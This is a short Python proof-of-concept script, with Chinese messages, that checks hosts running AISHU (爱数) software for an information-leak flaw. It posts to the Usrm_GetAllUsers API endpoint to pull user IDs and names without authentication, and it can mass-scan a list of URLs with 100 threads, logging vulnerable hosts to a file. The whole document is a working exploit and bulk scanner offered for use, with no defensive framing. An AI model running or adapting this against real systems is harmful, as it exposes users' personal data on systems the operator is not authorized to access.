import argparse,requests,sys,re
from multiprocessing.dummy import Pool

def poc(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    payload="/api/ShareMgnt/Usrm_GetAllUsers"
    data='[1,100]'
    header= {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    try:
        re1=requests.get(url=target,timeout=5,headers=header,verify=False)
        if re1.status_code==200:
            re2 = requests.post(url=target+payload,timeout=5,data=data,verify=False)
            if 'id' in  re2.text or 'name' in re2.text:    #判断响应包内容是否符合
                print(f'[+]{target}存在敏感信息泄露漏洞')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('爱数敏感信息泄露'+target+'\n')
            else:
                print(f'[-]{target}不存在漏洞')
        else:
            print(f'[*]{target}访问有问题')
    except:
        pass
def main():
    
    parse = argparse.ArgumentParser(description="爱数敏感信息泄露漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()